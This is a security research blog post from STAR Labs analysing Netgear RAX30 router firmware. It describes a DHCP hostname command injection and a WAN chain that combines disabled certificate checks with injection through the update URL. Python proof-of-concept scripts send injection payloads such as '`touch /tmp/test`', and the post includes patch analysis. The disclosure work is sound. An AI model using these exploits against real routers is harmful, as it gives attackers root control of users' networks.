---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-12-06_the-last-breath-of-our-netgear-rax30-bugs-a-tragic-tale-before-pwn2own-toronto-2.md
original_filename: 2022-12-06_the-last-breath-of-our-netgear-rax30-bugs-a-tragic-tale-before-pwn2own-toronto-2.md
title: The Last Breath of Our Netgear RAX30 Bugs - A Tragic Tale before Pwn2Own Toronto
  2022
category: documents
detected_topics:
- command-injection
- api-security
tags:
- imported
- documents
- command-injection
- api-security
language: en
raw_sha256: b9d415edeabfdaa84e8ddd649ac6426596b54bacfe34a1939a188972aeabdc30
text_sha256: b7230332f37d06250f8a38c97b8da1b0d1ea8fc6a9615bcb52f603ae9f4f3386
ingested_at: '2026-06-28T07:32:16Z'
sensitivity: unknown
redactions_applied: false
---

# The Last Breath of Our Netgear RAX30 Bugs - A Tragic Tale before Pwn2Own Toronto 2022

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-12-06_the-last-breath-of-our-netgear-rax30-bugs-a-tragic-tale-before-pwn2own-toronto-2.md
- Source Type: markdown
- Detected Topics: command-injection, api-security
- Ingested At: 2026-06-28T07:32:16Z
- Redactions Applied: False
- Raw SHA256: `b9d415edeabfdaa84e8ddd649ac6426596b54bacfe34a1939a188972aeabdc30`
- Text SHA256: `b7230332f37d06250f8a38c97b8da1b0d1ea8fc6a9615bcb52f603ae9f4f3386`


## Content

---
title: "The Last Breath of Our Netgear RAX30 Bugs - A Tragic Tale before Pwn2Own Toronto 2022"
page_title: "The Last Breath of Our Netgear RAX30 Bugs - A Tragic Tale before Pwn2Own Toronto 2022 | STAR Labs"
url: "https://starlabs.sg/blog/2022/12-the-last-breath-of-our-netgear-rax30-bugs-a-tragic-tale-before-pwn2own-toronto-2022/"
final_url: "https://starlabs.sg/blog/2022/12-the-last-breath-of-our-netgear-rax30-bugs-a-tragic-tale-before-pwn2own-toronto-2022/"
authors: ["Vu Thi Lan (@lanleft_)", "Nguyễn Hoàng Thạch (@hi_im_d4rkn3ss)"]
programs: ["Netgear"]
bugs: ["Command injection", "RCE", "Security code review"]
publication_date: "2022-12-06"
added_date: "2022-12-09"
source: "pentester.land/writeups.json"
original_index: 1809
---

Research December 6, 2022 By Vu Thi Lan, Nguyễn Hoàng Thạch 10 min read

# The Last Breath of Our Netgear RAX30 Bugs - A Tragic Tale before Pwn2Own Toronto 2022

Table of Contents

  * Background
  * Analysis of the LAN Bug
  * DHCP command injection
  * Exploitation of DHCP command injection
  * Patch analysis for DHCP command injection
  * WAN exploitation chain
  * Netgear Router RAX30 Improper Certificate Validation
  * Netgear Router RAX30 Command Injection
  * Exploitation for WAN
  * Patch analysis WAN bugs
  * Conclusion
  * References

## Background

Some time ago, we were playing with some Netgear routers and we learned so much from this target.

However, Netgear recently patched several vulnerabilities in their RAX30 router firmware, including the two vulnerabilities in the DHCP interface for the LAN side and one remote code execution vulnerability on the WAN side which we prepared for Pwn2Own Toronto 2022. This blog post focuses on the vulnerabilities found in version `1.0.7.78`You can download the firmware from this [link](https://kb.netgear.com/000064989/RAX30-Firmware-Version-1-0-7-78), and easily extract the firmware by using `binwalk`. All vulnerabilities were found and tested in version `1.0.7.78` of Netgear RAX30. Versions `1.0.7.78` and earlier are known to be susceptible as well.

## Analysis of the LAN Bug

Many services are exposed on the LAN side of the router, such as: `upnp`, `lighttpd`, `hostapd`, `minidlnad`, `smb`, and so on. We decided to focus on one of our LAN bugs in the `dhcp` service.

### DHCP command injection

One of the vulnerabilities we discovered was a command injection bug in the LAN side DHCP service. This bug occurred when we sent a DHCP request packet with the type `DHCPREQUEST` as we can see in the following code snippet.
  
  
  void __fastcall __noreturn dhcpd(int a1, int a2)
  {
  //truncated...
  LABEL_84:
  switch ( *state )
  {// truncated...
  case DHCPREQUEST:
  requested_1 = (unsigned int *)get_option(&packet, DHCP_REQUESTED_IP);
  server_id_1 = (int *)get_option(&packet, DHCP_SERVER_ID);
  hostname = (const char *)get_option(&packet, DHCP_HOST_NAME); // [1]
  option55 = (char *)get_option(&packet, DHCP_PARAM_REQ);
  if ( requested_1 )
  v7 = *requested_1;
  if ( server_id_1 )
  v83 = *server_id_1;
  v45 = (char *)get_option(&packet, DHCP_VENDOR);
  test_vendorid(&packet, v45, &v87);
  v46 = v87;
  if ( v87 )
  goto LABEL_12;
  v47 = (unsigned __int8 *)MAX_DHCP_INFORM_COUNT;
  break; 
  // truncated...
  LABEL_106:
  if ( lease )
  {
  // truncated...
  if ( hostname )
  {
  v51 = *((unsigned __int8 *)hostname - 1);
  if ( v51 >= 0x3F )
  v51 = 63;
  strncpy(lease + 24, hostname, v51);
  lease[v51 + 24] = 0;
  send_lease_info(0, (int)lease); // [2]
  }
  

The `hostname` field (at `[1]`) in the packet struct is stored in the `hostname` field in the `lease` struct. And then, if the `hostname` field is not empty, the `send_lease_info` function (at `[2]`) will be called. In the `send_lease_info` function, the `hostname` is copied into a param command (at `[1]`) for the system function, allowing for command injection at `[2]`.
  
  
  int __fastcall send_lease_info(int a1, dhcpOfferedAddr *lease) 
  {
  // truncated...
  if ( !a1 )
  {
  // truncated ...
  if ( body.hostName[0] )
  {
  strncpy((char *)HostName, body.hostName, 0x40u); // [1]
  snprintf((char *)v11, 0x102u, "%s", body.vendorid);
  }
  else
  {
  strncpy((char *)v10, "unknown", 0x40u);
  strncpy((char *)v11, "dhcpVendorid", 0x102u);
  }
  sprintf(
  command,
  "pudil -a %s %s %s %s \"%s\"",
  body.macAddr,
  body.ipAddr,
  (const char *)HostName,
  body.option55,
  (const char *)v11);
  system(command);  // [2]
  }
  //...
  }
  

#### Exploitation of DHCP command injection

To exploit this vulnerability, we had to find a way to fit our payload into the limited space of the `hostname` field, which was only `63` bytes. We managed to get our payload into the available bytes. Once we had our payload ready, we sent it in a DHCP request packet to the router, which then executed the payload with the permissions of the system function (it is `root permission` on this device). The script below is the Proof-of-Concept:
  
  
  import dhcppython
  from ipaddress import IPv4Address
  import socket
  import sys
  
  def send_requests_packet(hostname):
  
  opt_list = dhcppython.options.OptionList(
  [
  dhcppython.options.options.short_value_to_object(53, "DHCPREQUEST"),
  dhcppython.options.options.short_value_to_object(54, "192.168.5.1"),
  dhcppython.options.options.short_value_to_object(50, "192.168.5.11"),
  dhcppython.options.options.short_value_to_object(12, hostname),
  dhcppython.options.options.short_value_to_object(55, [1, 3, 6, 15, 26, 28, 51, 58, 59, 43])
  ]
  )
  pkt = dhcppython.packet.DHCPPacket(op="BOOTREQUEST", htype="ETHERNET", hlen=6, hops=0, xid=123456, secs=0, flags=0, ciaddr=IPv4Address(0), yiaddr=IPv4Address(0), siaddr=IPv4Address(0), giaddr=IPv4Address(0), chaddr="DE:AD:BE:EF:C0:DE", sname=b'', file=b'', options=opt_list)
  print(pkt) 
  print (pkt.asbytes)
  
  # send DHCP packet to server by udp protocol
  pl = pkt.asbytes
  SOC = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
  SOC.sendto(pl, ('192.168.5.1', 67) )
  
  send_requests_packet("a`touch /tmp/test`b")
  

### Patch analysis for DHCP command injection

The hotfix with the firmware version `1.0.9.90` patched a vulnerability by using `execve` instead of `system` function. We decided to take a look at the hotfix.
  
  
  int __fastcall send_lease_info(int a1, dhcpOfferedAddr *lease)
  {
  //...
  if ( body.hostName[0] )
  hostName = body.hostName;
  else
  hostName = "unknown";
  strncpy(hostname, hostName, 0x40u);
  if ( body.vendorid[0] )
  snprintf(vendorid, 0x102u, "%s", body.vendorid);
  else
  strncpy(vendorid, "dhcpVendorid", 0x102u);
  argv[4] = hostname;
  argv[6] = vendorid;
  argv[0] = "pudil";
  argv[2] = body.macAddr;
  argv[3] = body.ipAddr;
  argv[1] = "-a";
  argv[5] = body.option55;
  argv[7] = 0;
  v10 = fork();
  if ( v10 )
  {
  do
  {
  if ( waitpid(v10, &v12, 0) == -1 )
  perror("waitpid");
  }
  while ( (v12 & 0x7F) != 0 && ((v12 & 0x7F) + 1) << 24 >> 25 <= 0 );
  }
  else
  {
  execve("/bin/pudil", argv, 0);
  }
  }
  // ...
  

In our attempt to uncover a bypass for the patch, we dug deeper into the `pudil` binary. The binary runs with 8 arguments and parses them.
  
  
  int __fastcall main(int argc, char **argv, char **a3)
  {
  ///...
  while ( 1 )
  {
  option = getopt(argc, argv, "hamdfFiuU");
  // ...
  switch ( option )
  {
  case 'a':
  if ( argc != 7 )
  continue;
  v7 = 0;
  body_macAddr = argv[2];
  //..
  if ( !body_macAddr )
  {
  printf("\n\x1B[31m%s error agruments \x1B[0m\n", "get_connectedInterface");
  goto LABEL_14;
  }
  break;
  }
  ///...
  while ( 1 )
  {
  memset(v29, 0, 0x100u);
  snprintf((char *)v29, 0x100u, "cat /proc/pega/hostname| grep -i %s | awk '{printf $4}'", body_macAddr);
  DBG_PRINT("cmd = %s\n", (const char *)v29);
  v14 = popen((const char *)v29, "r");
  //...
  

The `main` function checks the `option`, and we noticed that the `body_macAddr` variable is passed directly through the `popen` function. However, upon further inspection of how the variable is created, we are confident that it is not vulnerable.
  
  
  cmsUtl_macNumToStr(lease->chaddr, body.macAddr);
  //...
  int __fastcall cmsUtl_macNumToStr(unsigned __int8 *char_mac, char *dest_str)
  {
  //...
  else
  {
  sprintf(
  dest_str,
  "%2.2x:%2.2x:%2.2x:%2.2x:%2.2x:%2.2x",
  *char_mac,
  char_mac[1],
  char_mac[2],
  char_mac[3],
  char_mac[4],
  char_mac[5]);
  return 0;
  }
  }
  

The `macAddr` variable is the result of converting 6 bytes of hexadecimal data to a hexadecimal string, so it is safe and not vulnerable. Therefore, this patch is quite effective for this vulnerability.

## WAN exploitation chain

After conducting a packet capture on the WAN port of the router, we discovered that the Netgear router was connecting to several domains including `devcom.up.netgear.com` and `time-e.netgear.com`. We found these connections to be quite interesting.

### Netgear Router RAX30 Improper Certificate Validation

Upon further investigation, we found that the `pucfu` binary, which is responsible for checking firmware upgrades, is executed at boot time by the `get_check_fw`->`fw_check_api` function in `"libfwcheck.so"`. This function sends a post HTTPS request to the `UpBaseURL`, which is defined in the `*d2d*` database as `"https://devcom.up.netgear.com/UpBackend/"`.

The post HTTPS request is sent using the `curl_post` function:
  
  
  size_t __fastcall curl_post(const char *url, const char *post_data, void **p_html
  {
  /* ... */ 
  ((void (*)(int, const char *, ...))fw_debug)(1, " URL is %s\n", url);
  curl_easy_setopt(curl, CURLOPT_URL, url);
  curl_easy_setopt(curl, CURLOPT_HTTPHEADER, https_hdr);
  curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
  curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0);  // [1]
  curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0);  // [2]
  curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1);
  v12 = strlen(post_data);
  curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, v12);
  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, curl_writedata_cb);
  curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);
  if ( curl_easy_perform(curl) )
  /* ... * /
  }
  

(This code snippet is in `curl_post`, corresponding to assembly code from address `0x6B60`).

The Netgear Router RAX30 has a security flaw that allows an attacker to control the firmware update process. This is possible because the `CURLOPT_SSL_VERIFYHOST` and `CURLOPT_SSL_VERIFYPEER` options are turned off at `[1]` and `[2]`, which means the client will not perform certificate checks on the server. This allows the attacker to set up a fake DHCP and DNS server and impersonate the update server.

The response from the server looks like this:
  
  
  {
  'status': 1,
  'url': ....
  }
  

The `url` in the response will be written as `"/tmp/fw/cfu_url_cache"` and it will be used later.

### Netgear Router RAX30 Command Injection

The `pufwUpgrade` binary is executed to check for firmware updates and the URL to check for updates is read from the file `"/tmp/fw/cfu_url_cache"`. The `FwUpgrade_download_FwInfo` function passes the URL to the `DownloadFiles` function as the first argument, which means the attacker can control the URL and potentially inject malicious commands.
  
  
  int __fastcall FwUpgrade_download_FwInfo(int option)
  {//...
  while ( 1 )
  {
  SetFileValue("/data/fwLastChecked", "lastDL_sku", v69);
  SetFileValue("/data/fwLastChecked", "lastDL_url", g_url_update);
  v4 = DownloadFiles(&fw_upgrade, "/tmp/fw/dl_fileinfo_unicode", "/tmp/fw/dl_result", 0);
  //...
  }
  }
  int __fastcall DownloadFiles(const char *url_update, const char *a2, char *filename, int a4)
  {
  //...
  if ( is_https )
  //...
  else
  snprintf(
  s,
  0x1F4u,
  "(curl --fail --insecure %s --max-time %d --speed-time 15 --speed-limit 1000 -o %s 2> %s; echo $? > %s)",
  url_update,  // [1]
  v7,
  a2,
  "/tmp/curl_result_err.txt",
  "/tmp/curl_result.txt");
  j_DBG_PRINT("%s:%d, cmd=%s\n", "DownloadFiles", 328, s);
  if ( j_pegaPopen(s, "r") )
  //...
  }
  

The URL for our router will be stored in a command line string, making it vulnerable to command injection.

#### Exploitation for WAN

To exploit this vulnerability, we can fake a `http server` to handle requests from the router. The following code shows how this can be done using Python:
  
  
  response_data = (
  '{\r\n'
  '  "status": 1,\r\n'
  '  "url": "`touch /tmp/aaa`"\r\n'
  '}\r\n'
  )
  
  class MyHandler(BaseHTTPRequestHandler):
  def do_GET(self):
  self.send_response(200)
  self.send_header("Content-type", "text/plain")
  self.end_headers()
  self.wfile.write(response_data)
  
  if __name__ == "__main__":
  webServer = HTTPServer(('0.0.0.0', 8000), MyHandler)
  print("Server started http://%s:%s" % ('0.0.0.0', 8000))
  #...
  

### Patch analysis WAN bugs

To patch this vulnerability, the LAN side will be patched with `execve` in version `1.0.9.90`. The following code shows how this is done:
  
  
  argv[0] = "curl";
  argv[2] = "--insecure";
  argv[3] = "--cacert";
  argv[4] = "/opt/xagent/certs/ca-bundle-mega.crt";
  argv[5] = url_update;
  argv[6] = "--max-time";
  argv[8] = "--speed-time";
  argv[9] = "15";
  argv[10] = "--speed-limit";
  argv[12] = "-o";
  argv[13] = a4;
  argv[14] = 0;
  //...
  execve("/bin/curl", argv, 0);
  }
  

Currently, we do not have a solution to bypass the patch for the `curl` binary. However, we have an idea to trigger this bug using a `cron` job. As shown in the UART log, the router runs `/bin/pufwUpgrade -s` to add a scheduler update to the `/var/spool/cron/crontabs/cfu` file, which file looks like this:
  
  
  # cat /var/spool/cron/crontabs/cfu
  59 3 * * * /bin/pufwUpgrade -A
  

This means that at `3:59 am`, the router will download the upgrade file and rewrite the system. But can we control the time of the `cfu` file?
  
  
  //...
  seed = time(0);
  srand(seed);
  rand_num = rand() % 180;
  memset(v19, 0, 0x200u);
  v14 = sub_156A8(rand_num, 60u);
  snprintf(
  (char *)v19,
  0x1FFu,
  "echo \"%d %d * * * /bin/pufwUpgrade -A \" >> %s/%s",
  rand_num % 60,
  v14 + 1,
  "/var/spool/cron/crontabs",
  "cfu");
  pegaSystem((int)v19);
  //...
  

The process of updating the firmware on our router happens once per day. The exact time is controlled by the `/bin/pufwUpgrade -s` command. We attempted to use the [ntpserver](https://github.com/limifly/ntpserver) to manipulate the time on the router, but it didn’t seem to work T_T

The logic of the `/bin/pufwUpgrade -A` command is as follows: `PerformAutoFwUpgrade` => `FwUpgrade_DownloadFW` => `FwUpgrade_WriteFW`. The code for these functions is shown below:
  
  
  int FwUpgrade_DownloadFW()
  {
  //...
  SetFileValue("/data/fwLastChecked", "lastDL_url", &url);
  v0 = DownloadFiles(url_fw_file, "/tmp/fw/dl_fw", "/tmp/fw/dl_result", 0);
  //...
  }
  int FwUpgrade_WriteFW()
  {
  fp = fopen("/tmp/fw/dl_fw", "rb");
  //...
  v2 = fread(v18, 1u, 0x20000u, fp);
  SignHeader = puUtl_getSignHeader(v18, v2, &v15, version, &v8, 31, db_ver, &v9, 31, board_id, &v10, 31, &length, 1);
  //...
  if ( v10 )
  {
  memset(&boardid, 0, 32);
  puComm_getBoardId(&boardid, 32);
  if ( strcmp((const char *)&boardid, our_board_id) )
  {
  DBG_PRINT("signed data board id mis-match %s != %s\n", board_id, &boardid);
  return -1;
  }
  }
  v3 = sub_15818("/proc/environment/single_image", &boardid);
  if (v3)
  {
  snprintf(cmd, 0x100u, "dd if=%s of=%s skip=%d iflag=skip_bytes", "/tmp/fw/dl_fw", "/tmp/fw/dl_fw.pkgtb", length);
  pegaSystem(cmd);
  memset(cmd, 0, sizeof(cmd));
  snprintf(cmd, 0x100u, "bcm_flasher %s", "/tmp/fw/dl_fw.pkgtb");
  v6 = pegaSystem(cmd);
  //...
  memset(cmd, 0, sizeof(cmd));
  strcpy(cmd, "reboot");
  pegaSystem(cmd);
  //...
  }
  }
  

In the code above, the program downloads the firmware and parses the header (without verifying the authenticity of the firmware). Then, it uses `bcm_flasher` to extract the firmware and reboot the router. We believe our exploit is still effective, but it only works once per day.

## Conclusion

I would like to thank my mentors, Jang and Thach, for their guidance and invaluable feedback throughout my internship. It’s been an amazing experience working and interacting with the employees and interns at STAR Labs.

I would also like to thank my team members Frances Loy, Bruce Chen & Jacob Soo for their support in reviewing and commenting on parts of this blog post.

## References

  * <https://kb.netgear.com/2649/NETGEAR-Open-Source-Code-for-Programmers-GPL>
